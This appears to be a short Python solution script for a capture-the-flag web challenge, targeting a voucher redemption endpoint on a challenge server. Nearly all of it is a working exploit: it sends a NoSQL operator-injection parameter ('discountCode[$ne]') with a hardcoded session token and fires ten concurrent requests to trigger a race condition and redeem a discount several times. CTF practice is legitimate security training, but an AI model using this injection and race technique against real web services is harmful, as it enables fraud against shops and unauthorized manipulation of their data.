import requests
from concurrent.futures import ThreadPoolExecutor

# Define the URL and headers
url = "http://speed.challs.srdnlen.it:8082/redeem"
headers = {
    "Host": "speed.challs.srdnlen.it:8082",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Accept": "*/*",
    "Referer": "http://speed.challs.srdnlen.it:8082/redeemVoucher",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhlODZlOGQ4YjZmYzFkNTNlZmI3NjAiLCJpYXQiOjE3MzczOTM4OTcsImV4cCI6MTczNzQyOTg5N30.B6tFcK_ayKshfkfRDKYA3q9GnjZzkA6BTWSeW1_NxrY",
    "Connection": "keep-alive",
}

# Define the query parameters
params = {
    "discountCode[$ne]": "null"
}

# Function to send a single request
def redeem_code():
    response = requests.get(url, headers=headers, params=params)
    print(response.json())

# Exploit by sending multiple concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(redeem_code) for _ in range(10)]

# Check the responses to see if multiple redemptions occurred

